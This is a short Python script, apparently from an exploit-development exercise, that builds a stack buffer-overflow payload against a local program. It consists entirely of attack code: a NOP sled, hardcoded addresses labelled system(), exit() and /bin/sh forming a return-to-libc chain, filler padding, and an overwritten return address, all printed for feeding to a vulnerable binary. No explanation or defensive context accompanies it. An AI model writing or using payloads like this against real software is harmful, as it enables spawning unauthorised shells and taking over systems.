from struct import pack

payload_len = 40		
nop = "\x90"*5
rip = 0x7fffffffd700

buf =  ""
buf += "\x00\x00\xd0\xbc\xe2\xf7\xff\x7f"  ## system()
buf += "\x00\x00\xc0\x13\xe2\xf7\xff\x7f" ## exit()
buf += "\x00\x00\x1b\xe0\xff\xff\xff\x7f"; ## /bin/sh


buf_len = len(buf)
nop_len = len(nop)
padding = "A"*(payload_len-nop_len-buf_len)

payload = nop + buf + padding + "\x00\xd7\xff\xff\xff\x7f\x00\x00"

print(payload)